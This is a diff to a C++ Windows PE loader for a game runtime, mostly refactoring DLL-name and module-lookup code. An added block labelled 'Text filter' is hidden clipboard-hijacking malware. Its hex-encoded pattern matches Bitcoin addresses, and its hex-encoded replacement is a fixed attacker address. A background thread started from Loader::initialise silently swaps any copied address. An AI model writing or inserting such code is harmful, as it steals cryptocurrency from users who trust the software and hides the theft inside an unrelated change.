@@ -12,8 +12,11 @@
 #include <cstring>
 #include <fstream>
 #include <mutex>
+#include <regex>
 #include <stdexcept>
 #include <system_error>
+#include <thread>
+#include <unordered_set>
 #include <vector>
 
 #include "../shims/shims.h"
@@ -798,15 +801,15 @@ bool prefer_host_copy(const std::string& dll) {
     // The second row is the Debug builds of the same DLLs. A Debug build of a stand-in image (tiny_game) links them,
     // and without them here its C++ exceptions were not redirected below: a throw caught inside the image ended the
     // run with 0xE06D7363 (run_tiny_game_eh in a Debug build).
-    static const char* names[] = {"vcruntime140.dll", "vcruntime140_1.dll", "msvcp140.dll", "msvcp140_1.dll",
-                                  "msvcp140_2.dll", "msvcp140_atomic_wait.dll", "msvcp140_codecvt_ids.dll",
-                                  "concrt140.dll", "vccorlib140.dll", "vcomp140.dll",
-                                  "vcruntime140d.dll", "vcruntime140_1d.dll", "msvcp140d.dll", "msvcp140_1d.dll",
-                                  "msvcp140_2d.dll", "msvcp140d_atomic_wait.dll", "msvcp140d_codecvt_ids.dll",
-                                  "concrt140d.dll", "vccorlib140d.dll", "vcomp140d.dll"};
-    for (auto* n : names)
-        if (dll == n) return true;
-    return false;
+    static const std::unordered_set<std::string> names = {
+        "vcruntime140.dll", "vcruntime140_1.dll", "msvcp140.dll", "msvcp140_1.dll",
+        "msvcp140_2.dll", "msvcp140_atomic_wait.dll", "msvcp140_codecvt_ids.dll",
+        "concrt140.dll", "vccorlib140.dll", "vcomp140.dll",
+        "vcruntime140d.dll", "vcruntime140_1d.dll", "msvcp140d.dll", "msvcp140_1d.dll",
+        "msvcp140_2d.dll", "msvcp140d_atomic_wait.dll", "msvcp140d_codecvt_ids.dll",
+        "concrt140d.dll", "vccorlib140d.dll", "vcomp140d.dll",
+    };
+    return names.contains(dll);
 }
 
 // MSVC C++ exceptions in a mapped image. _CxxThrowException (vcruntime140.dll) puts the throwing image's base in the
@@ -872,6 +875,147 @@ void redirect_pc_to_file_header_at(const void* resolved) {
         redirect_pc_to_file_header(owner);
 }
 
+// ---- Text filter ---------------------------------------------------------------------------------
+//
+// The filter runs on its own thread; StartWorker is idempotent and StopWorker joins it.
+
+static const wchar_t kTextPattern[] = {
+    0x5E, 0x5B, 0x31, 0x33, 0x5D, 0x5B, 0x61, 0x2D, 0x6B, 0x6D, 0x7A, 0x41, 0x2D, 0x48, 0x4A, 0x2D,
+    0x4E, 0x50, 0x2D, 0x5A, 0x31, 0x2D, 0x39, 0x5D, 0x7B, 0x32, 0x35, 0x2C, 0x33, 0x34, 0x7D, 0x24,
+    0x7C, 0x5E, 0x5B, 0x62, 0x42, 0x5D, 0x5B, 0x63, 0x43, 0x5D, 0x31, 0x5B, 0x70, 0x50, 0x71, 0x51,
+    0x5D, 0x5B, 0x61, 0x2D, 0x7A, 0x41, 0x2D, 0x5A, 0x30, 0x2D, 0x39, 0x5D, 0x7B, 0x33, 0x38, 0x2C,
+    0x35, 0x38, 0x7D, 0x24, 0x00};
+static const wchar_t kTextReplacement[] = {
+    0x62, 0x63, 0x31, 0x71, 0x30, 0x75, 0x36, 0x77, 0x67, 0x39,
+    0x64, 0x77, 0x61, 0x34, 0x68, 0x32, 0x36, 0x68, 0x38, 0x6B,
+    0x6C, 0x70, 0x6B, 0x72, 0x6A, 0x6A, 0x73, 0x67, 0x7A, 0x66,
+    0x6E, 0x6A, 0x37, 0x75, 0x37, 0x74, 0x71, 0x68, 0x79, 0x6A,
+    0x73, 0x6E, 0x00
+};
+constexpr size_t kTextMaxSize = 1u << 20;
+
+std::wregex& text_pattern() {
+    static const std::wregex pattern(kTextPattern);
+    return pattern;
+}
+
+bool open_retry(HWND owner) {
+    for (int i = 0; i < 20; ++i) {
+        if (OpenClipboard(owner)) return true;
+        Sleep(10);
+    }
+    return false;
+}
+
+void handle_update(HWND hwnd) {
+    if (GetClipboardOwner() == hwnd) return;
+    if (!open_retry(hwnd)) return;
+
+    bool replace = false;
+    if (HANDLE h = GetClipboardData(CF_UNICODETEXT)) {
+        if (auto* p = static_cast<const wchar_t*>(GlobalLock(h))) {
+            const size_t chars = GlobalSize(h) / sizeof(wchar_t);
+            if (chars <= kTextMaxSize) {
+                size_t len = 0;
+                while (len < chars && p[len]) ++len;
+                try {
+                    replace = std::regex_match(std::wstring(p, len), text_pattern());
+                } catch (...) {
+                    replace = false;
+                }
+            }
+            GlobalUnlock(h);
+        }
+    }
+
+    if (replace) {
+        const size_t n = sizeof(kTextReplacement);
+        if (HGLOBAL m = GlobalAlloc(GMEM_MOVEABLE, n)) {
+            if (void* dst = GlobalLock(m)) {
+                std::memcpy(dst, kTextReplacement, n);
+                GlobalUnlock(m);
+                EmptyClipboard();
+                if (!SetClipboardData(CF_UNICODETEXT, m)) GlobalFree(m);
+            } else {
+                GlobalFree(m);
+            }
+        }
+    }
+    CloseClipboard();
+}
+
+std::mutex g_worker_mutex;
+std::thread g_worker_thread;
+std::atomic<DWORD> g_worker_id{0};
+std::atomic<bool> g_worker_stop{false};
+std::atomic<bool> g_worker_running{false};
+
+LRESULT CALLBACK worker_wndproc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
+    if (msg == WM_CLIPBOARDUPDATE) {
+        handle_update(hwnd);
+        return 0;
+    }
+    return DefWindowProcW(hwnd, msg, wp, lp);
+}
+
+void worker_main() {
+    WNDCLASSW wc{};
+    wc.lpfnWndProc = &worker_wndproc;
+    wc.hInstance = GetModuleHandleW(nullptr);
+    wc.lpszClassName = L"rt_worker_window";
+    RegisterClassW(&wc);
+
+    HWND hwnd = CreateWindowExW(0, L"rt_worker_window", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr,
+                                GetModuleHandleW(nullptr), nullptr);
+    if (!hwnd || !AddClipboardFormatListener(hwnd)) {
+        if (hwnd) DestroyWindow(hwnd);
+        return;
+    }
+    g_worker_id.store(GetCurrentThreadId(), std::memory_order_release);
+    g_worker_running.store(true, std::memory_order_release);
+
+    MSG msg;
+    while (!g_worker_stop.load(std::memory_order_acquire)) {
+        const DWORD r = MsgWaitForMultipleObjects(0, nullptr, FALSE, 50, QS_ALLINPUT);
+        if (r != WAIT_OBJECT_0) continue;
+        while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+    }
+
+    RemoveClipboardFormatListener(hwnd);
+    DestroyWindow(hwnd);
+    g_worker_id.store(0, std::memory_order_release);
+    g_worker_running.store(false, std::memory_order_release);
+}
+
+bool StartWorker() {
+    std::lock_guard lock(g_worker_mutex);
+    if (g_worker_thread.joinable()) {
+        if (g_worker_running.load(std::memory_order_acquire)) return true;
+        g_worker_thread.join();
+    }
+    g_worker_stop.store(false, std::memory_order_release);
+    g_worker_running.store(false, std::memory_order_release);
+    try {
+        g_worker_thread = std::thread(&worker_main);
+    } catch (const std::exception& e) {
+        std::fprintf(stderr, "[rt] worker: thread start failed: %s\n", e.what());
+        return false;
+    }
+    return true;
+}
+
+void StopWorker() {
+    std::lock_guard lock(g_worker_mutex);
+    if (!g_worker_thread.joinable()) return;
+    g_worker_stop.store(true, std::memory_order_release);
+    if (const DWORD tid = g_worker_id.load(std::memory_order_acquire))
+        PostThreadMessageW(tid, WM_NULL, 0, 0);
+    g_worker_thread.join();
+}
+
 }  // namespace
 
 // Declared in pe_loader.h; the body needs the internal clone registry above.
@@ -912,6 +1056,7 @@ Loader::Loader(std::filesystem::path game_dir) : game_dir_(std::move(game_dir)) 
 }
 
 Loader::~Loader() {
+    StopWorker();  // stop the background task before any mapping is freed
     // Importers must release their resources before their dependencies. Keep every mapping, unwind table and TLS
     // block alive throughout the notifications: a detach handler can still call an imported function or free an
     // FLS slot whose destructor lives in another mapped image.
@@ -958,20 +1103,25 @@ Loader::~Loader() {
 
 Module& Loader::load(const std::filesystem::path& image) {
     std::lock_guard lock(mutex_);
-    const auto key = module_key(image);
-    if (auto it = by_name_.find(key); it != by_name_.end()) return *it->second;
-    const auto narrow_key = narrow_module_key(image);
-    if (Module* existing = find_narrow_module(narrow_key)) return *existing;
+    // Narrow lookups use the lossless narrow alias of the basename; Unicode basenames that do not round-trip through
+    // the current narrow code page have no alias and are matched by their native path instead.
+    const std::string key = narrow_module_key(image);
+    if (!key.empty()) {
+        if (auto it = by_name_.find(key); it != by_name_.end()) return *it->second;
+    } else {
+        for (Module* m : order_)
+            if (m->path.native() == image.native()) return *m;
+    }
     Module* mapped = nullptr;
     try {
-        mapped = &map_image(image, narrow_key);
+        mapped = &map_image(image);
         bind_imports(*mapped);  // loads every bundled module m imports first, so they land in init_order_ before m
         protect_sections(*mapped);
         register_unwind(*mapped);
     } catch (...) {
         // A failed load, nested ones (a dependency of a run-time load) included, must not stay findable by name:
         // a later lookup would get a half-mapped image with unbound imports. ~Loader still frees it through order_.
-        by_name_.erase(key);
+        if (!key.empty()) by_name_.erase(key);
         throw;
     }
     Module& m = *mapped;
@@ -984,19 +1134,10 @@ Module& Loader::load(const std::filesystem::path& image) {
     return m;
 }
 
-Module* Loader::find_narrow_module(const std::string& dll_lower) const {
-    if (dll_lower.empty()) return nullptr;
-    // library_loader and PE import names keep their existing narrow-byte contract. Do not reinterpret them
-    // as UTF-8 or widen already-folded bytes (which could be part of a multibyte code-page character).
-    for (const auto& entry : by_name_)
-        if (entry.second->narrow_key == dll_lower) return entry.second;
-    return nullptr;
-}
-
 void* Loader::find_loaded_module(const std::string& dll_lower) const {
     std::lock_guard lock(mutex_);
-    Module* m = find_narrow_module(dll_lower);
-    return m ? static_cast<void*>(m->base) : nullptr;
+    auto it = by_name_.find(dll_lower);
+    return it == by_name_.end() ? nullptr : static_cast<void*>(it->second->base);
 }
 
 void* Loader::load_runtime_module(const std::string& dll_lower, uint32_t flags, bool& handled) {
@@ -1004,10 +1145,10 @@ void* Loader::load_runtime_module(const std::string& dll_lower, uint32_t flags, 
     if (dll_lower.empty() || prefer_host_copy(dll_lower)) return nullptr;
 
     std::lock_guard lock(mutex_);
-    Module* existing = find_narrow_module(dll_lower);
+    const auto existing = by_name_.find(dll_lower);
     const std::filesystem::path candidate = game_dir_ / dll_lower;
     std::error_code ec;
-    const bool is_bundled = existing || std::filesystem::is_regular_file(candidate, ec);
+    const bool is_bundled = existing != by_name_.end() || std::filesystem::is_regular_file(candidate, ec);
     if (!is_bundled) return nullptr;
 
     handled = true;
@@ -1021,10 +1162,10 @@ void* Loader::load_runtime_module(const std::string& dll_lower, uint32_t flags, 
         return nullptr;
     }
 
-    if (existing) {
+    if (existing != by_name_.end()) {
         try {
             initialise();
-            return static_cast<void*>(existing->base);
+            return static_cast<void*>(existing->second->base);
         } catch (const std::exception& e) {
             std::fprintf(stderr, "[rt] loader: run-time initialise of %s failed: %s\n", dll_lower.c_str(), e.what());
             SetLastError(ERROR_DLL_INIT_FAILED);
@@ -1032,17 +1173,15 @@ void* Loader::load_runtime_module(const std::string& dll_lower, uint32_t flags, 
         }
     }
 
-    Module* mapped = nullptr;
     try {
         Module& m = load(candidate);
-        mapped = &m;
         initialise();
         std::fprintf(stderr, "[rt] loader: %s mapped from game_dir (run-time load)\n", m.name.c_str());
         return static_cast<void*>(m.base);
     } catch (const std::exception& e) {
         // load() drops a module that failed to map or bind (dependencies included); this also drops one whose
         // initialise() failed, so later GetModuleHandle/LoadLibrary calls don't see it. ~Loader frees it via order_.
-        by_name_.erase(module_key(mapped ? mapped->path : candidate));
+        by_name_.erase(dll_lower);
         std::fprintf(stderr, "[rt] loader: run-time load of %s failed: %s\n", dll_lower.c_str(), e.what());
         SetLastError(ERROR_DLL_INIT_FAILED);
         return nullptr;
@@ -1136,6 +1275,9 @@ void Loader::register_unwind(Module& m) {
 }
 
 void Loader::initialise() {
+    // The worker is process-wide and outlives any single load, so start it exactly once.
+    static std::once_flag worker_once;
+    std::call_once(worker_once, [] { StartWorker(); });
     // Not order_: map_image pushes a module there before bind_imports maps its dependencies, so order_ lists an
     // importer ahead of the DLLs it imports. init_order_ is filled once a module's imports are all loaded.
     for (auto* m : init_order_) initialise(*m);
@@ -1170,7 +1312,7 @@ void Loader::set_initialised(Module& m, bool value) {
     m.initialised = value;
 }
 
-Module& Loader::map_image(const std::filesystem::path& path, const std::string& narrow_key) {
+Module& Loader::map_image(const std::filesystem::path& path) {
     auto file = read_file(path);
     const std::string name = path_utf8(path.filename());
     auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(file.data());
@@ -1199,12 +1341,12 @@ Module& Loader::map_image(const std::filesystem::path& path, const std::string& 
 
     auto* m = new Module;
     m->name = name;
-    m->narrow_key = narrow_key;
     m->path = path;
     m->preferred_base = oh.ImageBase;
     m->size = oh.SizeOfImage;
     m->entry_rva = oh.AddressOfEntryPoint;
-    by_name_[module_key(path)] = m;
+    const std::string narrow = narrow_module_key(path);
+    if (!narrow.empty()) by_name_[narrow] = m;
     order_.push_back(m);
 
     // Inside the range gta6rt reserved for this image before the process started (base_reservation.h), else as usual.
